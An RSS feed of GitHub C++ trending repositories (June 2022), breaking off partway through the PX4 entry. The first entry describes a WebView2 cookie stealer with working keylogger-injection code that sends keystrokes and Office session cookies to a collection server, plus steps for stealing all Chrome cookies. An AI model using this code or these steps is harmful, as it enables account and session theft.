<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-29T01:33:21Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>mrd0x/WebView2-Cookie-Stealer</title>
    <updated>2022-06-29T01:33:21Z</updated>
    <id>tag:github.com,2022-06-29:/mrd0x/WebView2-Cookie-Stealer</id>
    <link href="https://github.com/mrd0x/WebView2-Cookie-Stealer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Blog Post&lt;/h1&gt; &#xA;&lt;p&gt;Please read &lt;a href=&#34;https://mrd0x.com/attacking-with-webview2-applications/&#34; target=&#34;_blank&#34;&gt;this blog post&lt;/a&gt; to get more information.&lt;/p&gt; &#xA;&lt;h1&gt;Source Code&lt;/h1&gt; &#xA;&lt;p&gt;This code is a modified version of &lt;a href=&#34;https://github.com/MicrosoftEdge/WebView2Samples&#34; target=&#34;_blank&#34;&gt;Microsoft&#39;s WebView2 Code&lt;/a&gt;. The current code can be cleaned up and made much better.&lt;/p&gt; &#xA;&lt;h1&gt;Demo&lt;/h1&gt; &#xA;&lt;h2&gt;Launch Example&lt;/h2&gt; &#xA;&lt;img src=&#34;https://github.com/mrd0x/WebView2-Cookie-Stealer/raw/main/launch.gif&#34;&gt; &#xA;&lt;h2&gt;Usage Example&lt;/h2&gt; &#xA;&lt;img src=&#34;https://github.com/mrd0x/WebView2-Cookie-Stealer/raw/main/demo2.gif&#34;&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;Tested on Windows 10 &amp;amp; 11.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;When the binary is executed &lt;code&gt;https://office.com/login&lt;/code&gt; is loaded up. A JavaScript keylogger is injected into every page and keystrokes are sent to &lt;code&gt;http://127.0.0.1:8080&lt;/code&gt;. Furthermore, upon the user successfully authenticating the cookies for &lt;code&gt;www.office.com&lt;/code&gt; are base64-encoded and sent to &lt;code&gt;http://127.0.0.1:8080&lt;/code&gt; via an HTTP GET request.&lt;/p&gt; &#xA;&lt;h1&gt;Modifying JavaScript&lt;/h1&gt; &#xA;&lt;p&gt;If you&#39;d like to modify the JavaScript the code that needs to be changed is shown below at &lt;code&gt;line 1096&lt;/code&gt; in &lt;code&gt;AppWindow.cpp&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;coreWebView2-&amp;gt;AddScriptToExecuteOnDocumentCreated(L&#34;var link = \&#34;http://127.0.0.1:8080/keylog?k=\&#34;;var l = \&#34;\&#34;;document.onkeypress = function (e){l += e.key;var req = new XMLHttpRequest();req.open(\&#34;GET\&#34;,link.concat(l), true);req.send();}&#34;, nullptr);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Stealing Chrome Cookies&lt;/h1&gt; &#xA;&lt;p&gt;WebView2 allows you to launch with an existing User Data Folder (UDF) rather than creating a new one. The UDF contains all passwords, sessions, bookmarks etc. Chrome&#39;s UDF is located at &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Google\Chrome\User Data&lt;/code&gt;. We can simply tell WebView2 to start the instance using this profile and upon launch extract all cookies and transfer them to the attacker&#39;s server.&lt;/p&gt; &#xA;&lt;p&gt;The only catch is that WebView2 looks for a folder called &lt;code&gt;EBWebView&lt;/code&gt; instead of &lt;code&gt;User Data&lt;/code&gt; (not sure why). Copy the &lt;code&gt;User Data&lt;/code&gt; folder and rename it to &lt;code&gt;EBWebView&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Required Changes&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;At &lt;code&gt;line 41&lt;/code&gt; in &lt;code&gt;app.cpp&lt;/code&gt;:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Change &lt;code&gt;std::wstring userDataFolder(L&#34;&#34;);&lt;/code&gt; to &lt;code&gt;std::wstring userDataFolder(L&#34;C:\\Path\\To\\Temp&#34;);&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;The specified folder must contain the &lt;code&gt;EBWebView&lt;/code&gt; folder which WebView2 will read from.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;At &lt;code&gt;line 40&lt;/code&gt; in &lt;code&gt;ScenarioCookieManagement.cpp&lt;/code&gt;:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Change &lt;code&gt;GetCookiesHelper(L&#34;https://login.microsoftonline.com&#34;);&lt;/code&gt; to &lt;code&gt;GetCookiesHelper(L&#34;&#34;);&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;When GetCookiesHelper is invoked without any website being provided it will extract all cookies.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note: This will not work with the current application if there is a large quantity of cookies because the application sends them using a GET Request which has a length limit.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Important Functions&lt;/h1&gt; &#xA;&lt;p&gt;If you&#39;d like to make modifications to the binary you&#39;ll find information about the important functions below.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;AppStartPage.cpp - &lt;code&gt;GetUri()&lt;/code&gt; function has the URL that is loaded upon binary execution.&lt;/li&gt; &#xA; &lt;li&gt;ScenarioCookieManagement.cpp - &lt;code&gt;SendCookies()&lt;/code&gt; function contains the IP address and port where the cookies are sent.&lt;/li&gt; &#xA; &lt;li&gt;AppWindow.cpp - &lt;code&gt;CallCookieFunction()&lt;/code&gt; function waits until the URL starts with &lt;code&gt;https://www.office.com/?auth=&lt;/code&gt; and calls &lt;code&gt;ScenarioCookieManagement::GetCookiesHelper(L&#34;https://www.office.com&#34;)&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;WebView2APISample.rc - Cosmetic changes &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Remove the menu bar by setting all &lt;code&gt;POPUP&lt;/code&gt; values to &lt;code&gt;&#34;&#34;&lt;/code&gt;.&lt;/li&gt; &#xA;   &lt;li&gt;Change &lt;code&gt;IDS_APP_TITLE&lt;/code&gt; and &lt;code&gt;IDC_WEBVIEW2APISAMPLE&lt;/code&gt;. This is the name of the application in the title bar.&lt;/li&gt; &#xA;   &lt;li&gt;Change &lt;code&gt;IDI_WEBVIEW2APISAMPLE&lt;/code&gt; and &lt;code&gt;IDI_WEBVIEW2APISAMPLE_INPRIVATE&lt;/code&gt; and &lt;code&gt;IDI_SMALL&lt;/code&gt;. These point to a &lt;code&gt;.ico&lt;/code&gt; file which is the icon for this application.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Toolbar.cpp - &lt;code&gt;itemHeight&lt;/code&gt; must be set to 0 to remove the top menu. This is already taken care of in this code.&lt;/li&gt; &#xA; &lt;li&gt;AppWindow.cpp - &lt;code&gt;LoadImage()&lt;/code&gt; should be commented out. This hides the blue splash image. This is already taken care of in this code.&lt;/li&gt; &#xA; &lt;li&gt;App.cpp - &lt;code&gt;new AppWindow(creationModeId, WebViewCreateOption(), initialUri, userDataFolder, false);&lt;/code&gt; change the last param value to &lt;code&gt;true&lt;/code&gt;. This hides the toolbar. This is already taken care of in this code.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>rizinorg/cutter</title>
    <updated>2022-06-29T01:33:21Z</updated>
    <id>tag:github.com,2022-06-29:/rizinorg/cutter</id>
    <link href="https://github.com/rizinorg/cutter" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Free and Open Source Reverse Engineering Platform powered by rizin&lt;/p&gt;&lt;hr&gt;&lt;img width=&#34;150&#34; height=&#34;150&#34; align=&#34;left&#34; style=&#34;float: left; margin: 0 10px 0 0;&#34; alt=&#34;Cutter logo&#34; src=&#34;https://raw.githubusercontent.com/rizinorg/cutter/dev/src/img/cutter.svg?sanitize=true&#34;&gt; &#xA;&lt;h1&gt;Cutter&lt;/h1&gt; &#xA;&lt;p&gt;Cutter is a free and open-source reverse engineering platform powered by &lt;a href=&#34;https://github.com/rizinorg/rizin&#34;&gt;rizin&lt;/a&gt;. It aims at being an advanced and customizable reverse engineering platform while keeping the user experience in mind. Cutter is created by reverse engineers for reverse engineers.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/rizinorg/cutter/actions?query=workflow%3A%22Cutter+CI%22&#34;&gt;&lt;img src=&#34;https://github.com/rizinorg/cutter/workflows/Cutter%20CI/badge.svg?sanitize=true&#34; alt=&#34;Cutter CI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.appveyor.com/project/rizinorg/cutter/branch/dev&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/tn7kttv55b8wf799/branch/dev?svg=true&#34; alt=&#34;Build status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://lgtm.com/projects/g/rizinorg/cutter/alerts/&#34;&gt;&lt;img src=&#34;https://img.shields.io/lgtm/alerts/g/rizinorg/cutter.svg?logo=lgtm&amp;amp;logoWidth=18&#34; alt=&#34;Total alerts&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/rizinorg/cutter/dev/docs/source/images/screenshot.png&#34; alt=&#34;Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Learn more at &lt;a href=&#34;https://cutter.re&#34;&gt;cutter.re&lt;/a&gt;.&lt;/h2&gt; &#xA;&lt;h2&gt;Getting Cutter&lt;/h2&gt; &#xA;&lt;h3&gt;Download&lt;/h3&gt; &#xA;&lt;p&gt;Cutter release binaries for all major platforms (Linux, macOS, Windows) can be downloaded from &lt;a href=&#34;https://github.com/rizinorg/cutter/releases&#34;&gt;GitHub Releases&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Linux&lt;/strong&gt;: Download the &lt;code&gt;.AppImage&lt;/code&gt; file. Then make it executable and run as below or use &lt;a href=&#34;https://github.com/TheAssassin/AppImageLauncher&#34;&gt;AppImageLauncher&lt;/a&gt;.&lt;/p&gt; &lt;p&gt;&lt;code&gt;chmod +x Cutter*.AppImage; ./Cutter*.AppImage&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;macOS&lt;/strong&gt;: Download the &lt;code&gt;.dmg&lt;/code&gt; file or use &lt;a href=&#34;https://github.com/Homebrew/homebrew-cask&#34;&gt;Homebrew Cask&lt;/a&gt;:&lt;/p&gt; &lt;p&gt;&lt;code&gt;brew install --cask cutter&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;: Download the &lt;code&gt;.zip&lt;/code&gt; archive or use &lt;a href=&#34;https://chocolatey.org&#34;&gt;Chocolatey&lt;/a&gt;:&lt;/p&gt; &lt;p&gt;&lt;code&gt;choco install cutter&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Build from sources&lt;/h3&gt; &#xA;&lt;p&gt;To build Cutter from sources, please check the &lt;a href=&#34;https://cutter.re/docs/building.html&#34;&gt;Building Docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Docker image&lt;/h3&gt; &#xA;&lt;p&gt;To deploy &lt;em&gt;cutter&lt;/em&gt; using a pre-built &lt;code&gt;Dockerfile&lt;/code&gt;, it&#39;s possible to use the &lt;a href=&#34;https://raw.githubusercontent.com/rizinorg/cutter/dev/docker&#34;&gt;provided configuration&lt;/a&gt;. The corresponding &lt;code&gt;README.md&lt;/code&gt; file also contains instructions on how to get started using the docker image with minimal effort.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://cutter.re/docs/user-docs.html&#34;&gt;User Guide&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://cutter.re/docs/contributing.html&#34;&gt;Contribution Guidelines&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://cutter.re/docs/contributing/code.html&#34;&gt;Developers Docs&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h2&gt;Plugins&lt;/h2&gt; &#xA;&lt;p&gt;Cutter supports both Python and Native C++ plugins.&lt;/p&gt; &#xA;&lt;p&gt;Our community has built many plugins and useful scripts for Cutter such as the native integration of &lt;a href=&#34;https://github.com/rizinorg/rz-ghidra&#34;&gt;Ghidra decompiler&lt;/a&gt; or the plugin to visualize DynamoRIO code coverage. You can find a list of cutter plugins linked below. Feel free to extend it with your own plugins and scripts for Cutter.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/rizinorg/cutter-plugins&#34;&gt;Official &amp;amp; Community Plugins&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cutter.re/docs/plugins.html&#34;&gt;Plugins Development Guide&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Help&lt;/h2&gt; &#xA;&lt;p&gt;Please use the following channels to ask for help from Cutter developers and community:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Telegram:&lt;/strong&gt; &lt;a href=&#34;https://t.me/cutter_re&#34;&gt;https://t.me/cutter_re&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Mattermost:&lt;/strong&gt; &lt;a href=&#34;https://im.rizin.re&#34;&gt;https://im.rizin.re&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;IRC:&lt;/strong&gt; #cutter on &lt;a href=&#34;https://web.libera.chat/&#34;&gt;https://web.libera.chat/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Twitter:&lt;/strong&gt; &lt;a href=&#34;https://twitter.com/cutter_re&#34;&gt;@cutter_re&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>PX4/PX4-Autopilot</title>
    <updated>2022-06-29T01:33:21Z</updated>
    <id>tag:github.com,2022-06-29:/PX4/PX4-Autopilot</id>
    <link href="https://github.com/PX4/PX4-Autopilot" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PX4 Autopilot Software&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PX4 Drone Autopilot&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/PX4/PX4-Autopilot.svg?sanitize=true&#34; alt=&#34;Releases&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://zenodo.org/badge/latestdoi/22634/PX4/PX4-Autopilot&#34;&gt;&lt;img src=&#34;https://zenodo.org/badge/22634/PX4/PX4-Autopilot.svg?sanitize=true&#34; alt=&#34;DOI&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/actions?query=workflow%3A%22Nuttx+Targets%22?branch=master&#34;&gt;&lt;img src=&#34;https://github.com/PX4/PX4-Autopilot/workflows/Nuttx%20Targets/badge.svg?sanitize=true&#34; alt=&#34;Nuttx Targets&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/actions?query=workflow%3A%22SITL+Tests%22&#34;&gt;&lt;img src=&#34;https://github.com/PX4/PX4-Autopilot/workflows/SITL%20Tests/badge.svg?branch=master&#34; alt=&#34;SITL Tests&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://join.slack.com/t/px4/shared_invite/zt-si4xo5qs-R4baYFmMjlrT4rQK5yUnaA&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/PX4/PX4-Autopilot/main/.github/slack.svg?sanitize=true&#34; alt=&#34;Slack&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repository holds the &lt;a href=&#34;http://px4.io&#34;&gt;PX4&lt;/a&gt; flight control solution for drones, with the main applications located in the &lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/tree/master/src/modules&#34;&gt;src/modules&lt;/a&gt; directory. It also contains the PX4 Drone Middleware Platform, which provides drivers and middleware to run drones.&lt;/p&gt; &#xA;&lt;p&gt;PX4 is highly portable, OS-independent and supports Linux, NuttX and MacOS out of the box.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Official Website: &lt;a href=&#34;http://px4.io&#34;&gt;http://px4.io&lt;/a&gt; (License: BSD 3-clause, &lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/raw/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/airframes/airframe_reference.html&#34;&gt;Supported airframes&lt;/a&gt; (&lt;a href=&#34;http://px4.io/#airframes&#34;&gt;portfolio&lt;/a&gt;): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/frames_multicopter/&#34;&gt;Multicopters&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/frames_plane/&#34;&gt;Fixed wing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/frames_vtol/&#34;&gt;VTOL&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/frames_autogyro/&#34;&gt;Autogyro&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/frames_rover/&#34;&gt;Rover&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;many more experimental types (Blimps, Boats, Submarines, High altitude balloons, etc)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Releases: &lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/releases&#34;&gt;Downloads&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Building a PX4 based drone, rover, boat or robot&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://docs.px4.io/master/en/&#34;&gt;PX4 User Guide&lt;/a&gt; explains how to assemble &lt;a href=&#34;https://docs.px4.io/master/en/airframes/airframe_reference.html&#34;&gt;supported vehicles&lt;/a&gt; and fly drones with PX4. See the &lt;a href=&#34;https://docs.px4.io/master/en/#support&#34;&gt;forum and chat&lt;/a&gt; if you need help!&lt;/p&gt; &#xA;&lt;h2&gt;Changing code and contributing&lt;/h2&gt; &#xA;&lt;p&gt;This &lt;a href=&#34;https://docs.px4.io/master/en/development/development.html&#34;&gt;Developer Guide&lt;/a&gt; is for software developers who want to modify the flight stack and middleware (e.g. to add new flight modes), hardware integrators who want to support new flight controller boards and peripherals, and anyone who wants to get PX4 working on a new (unsupported) airframe/vehicle.&lt;/p&gt; &#xA;&lt;p&gt;Developers should read the &lt;a href=&#34;https://docs.px4.io/master/en/contribute/&#34;&gt;Guide for Contributions&lt;/a&gt;. See the &lt;a href=&#34;https://dev.px4.io/master/en/#support&#34;&gt;forum and chat&lt;/a&gt; if you need help!&lt;/p&gt; &#xA;&lt;h3&gt;Weekly Dev Call&lt;/h3&gt; &#xA;&lt;p&gt;The PX4 Dev Team syncs up on a &lt;a href=&#34;https://dev.px4.io/master/en/contribute/#dev_call&#34;&gt;weekly dev call&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; The dev call is open to all interested developers (not just the core dev team). This is a great opportunity to meet the team and contribute to the ongoing development of the platform. It includes a QA session for newcomers. All regular calls are listed in the &lt;a href=&#34;https://www.dronecode.org/calendar/&#34;&gt;Dronecode calendar&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Maintenance Team&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Project: Founder &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/LorenzMeier&#34;&gt;Lorenz Meier&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Architecture &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/dagar&#34;&gt;Daniel Agar&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/labels/devcall&#34;&gt;Dev Call&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/mrpollo&#34;&gt;Ramon Roche&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Communication Architecture &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/bkueng&#34;&gt;Beat Kueng&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/JulianOes&#34;&gt;Julian Oes&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;UI in QGroundControl &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/dogmaphobic&#34;&gt;Gus Grubba&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/labels/multicopter&#34;&gt;Multicopter Flight Control&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/bresch&#34;&gt;Mathieu Bresciani&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/labels/multicopter&#34;&gt;Multicopter Software Architecture&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/MaEtUgR&#34;&gt;Matthias Grob&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/labels/vtol&#34;&gt;VTOL Flight Control&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/RomanBapst&#34;&gt;Roman Bapst&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/labels/fixedwing&#34;&gt;Fixed Wing Flight Control&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/RomanBapst&#34;&gt;Roman Bapst&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;OS / NuttX &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/davids5&#34;&gt;David Sidrane&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Driver Architecture &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/dagar&#34;&gt;Daniel Agar&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Commander Architecture &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/julianoes&#34;&gt;Julian Oes&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/labels/uavcan&#34;&gt;UAVCAN&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/dagar&#34;&gt;Daniel Agar&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/issues?q=is%3Aopen+is%3Aissue+label%3A%22state+estimation%22&#34;&gt;State Estimation&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/priseborough&#34;&gt;Paul Riseborough&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Vision based navigation and Obstacle Avoidance &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/markusachtelik&#34;&gt;Markus Achtelik&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;RTPS/ROS2 Interface &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/TSC21&#34;&gt;Nuno Marques&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See also &lt;a href=&#34;https://px4.io/community/maintainers/&#34;&gt;maintainers list&lt;/a&gt; (px4.io) and the &lt;a href=&#34;https://github.com/PX4/PX4-Autopilot/graphs/contributors&#34;&gt;contributors list&lt;/a&gt; (Github).&lt;/p&gt; &#xA;&lt;h2&gt;Supported Hardware&lt;/h2&gt; &#xA;&lt;p&gt;This repository contains code supporting Pixhawk standard boards (best supported, best tested, recommended choice) and proprietary boards.&lt;/p&gt; &#xA;&lt;h3&gt;Pixhawk Standard Boards&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;FMUv6X and FMUv6U (STM32H7, 2021) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Various vendors will provide FMUv6X and FMUv6U based designs Q3/2021&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;FMUv5 and FMUv5X (STM32F7, 2019/20) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixhawk4.html&#34;&gt;Pixhawk 4 (FMUv5)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixhawk4_mini.html&#34;&gt;Pixhawk 4 mini (FMUv5)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/cuav_v5_plus.html&#34;&gt;CUAV V5+ (FMUv5)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/cuav_v5_nano.html&#34;&gt;CUAV V5 nano (FMUv5)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/auterion_skynode.html&#34;&gt;Auterion Skynode (FMUv5X)&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;FMUv4 (STM32F4, 2015) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixracer.html&#34;&gt;Pixracer&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixhawk3_pro.html&#34;&gt;Pixhawk 3 Pro&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;FMUv3 (STM32F4, 2014) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixhawk-2.html&#34;&gt;Pixhawk 2&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixhawk_mini.html&#34;&gt;Pixhawk Mini&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.px4.io/master/en/flight_controller/pixhack_v3.html&#34;&gt;CUAV Pixhack v3&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;FMUv2 (STM32F4, 2013) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a 